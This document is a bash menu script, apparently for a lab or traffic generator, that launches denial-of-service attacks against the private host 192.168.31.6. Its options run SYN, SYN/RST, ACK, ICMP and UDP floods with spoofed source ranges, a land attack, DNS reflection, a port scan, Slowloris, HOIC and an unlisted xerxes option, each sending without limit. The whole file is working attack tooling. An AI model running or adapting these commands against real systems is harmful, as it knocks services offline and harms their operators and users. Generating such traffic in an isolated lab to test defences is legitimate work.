#/bin/bash

trap 'echo""; cd /root ; exit' INT

ENTRY=1

while [ $ENTRY = 1 ] ; do
	echo
	echo "a) SYN Flood"
	echo "b) SYN|RST Flood"
	echo "c) ACK Flood"
	echo "d) Land Attack"
	echo "e) ICMP Flood"
	echo "f) UDP Flood"
	echo "g) Random IPs Flood"
	echo "h) Port Scan"
	echo "i) DNS use for reflective attack"
	echo "j) DNS use for as target reflective attack"
	echo "k) SlowLoris"
	echo "l) HOIC"
	echo
	echo -n "Select the attack type : "

	read RESPONSE
	if [ ! -z "$RESPONSE" ] ; then
		case $RESPONSE in
		a)	./bin/attacker -s 10.0.0.0/24 -d 192.168.31.6 -p80 --sf -c -1
			;;
		b)	./bin/attacker -s 10.0.0.0/24 -d 192.168.31.6 -p80 --sr -c -1
			;;
		c)	./bin/attacker -s 10.0.0.0/24 -d 192.168.31.6 -p80 --af -c -1
			;;
		d)	./bin/attacker -s 192.168.31.100 -d 192.168.31.6 --la -c -1
			;;
		e)	./bin/attacker -s 10.0.0.1 -d 192.168.31.6 --if -c -1
			;;
		f)	./bin/attacker -s 10.0.0.0/29 -d 192.168.31.6 --uf -c -1
			;;
		g)	./bin/attacker -s 10.0.0.0/29 -d 192.168.31.6 --bi -c -1
			;;
		h)	./bin/attacker -s 10.0.0.1 -d 192.168.31.6 --sf -c -1
			;;
		i)	./bin/attacker -s 10.0.0.0/24 -d 192.168.31.6  --dn -c -1
			;;
		j)	./bin/attacker -s 10.0.0.0/24 -d 192.168.31.6  --dr -c -1
			;;
		k)	(cd /tmp ; perl tools/slowloris.pl -dns 192.168.31.6 -num 500 -timeout 5 -tcpto 5)
			;;
		l)	python tools/pyhoic.py
			;;
		m)	xerxes 192.168.31.6 80
			;;
		*)
			;;
		esac
	fi
done
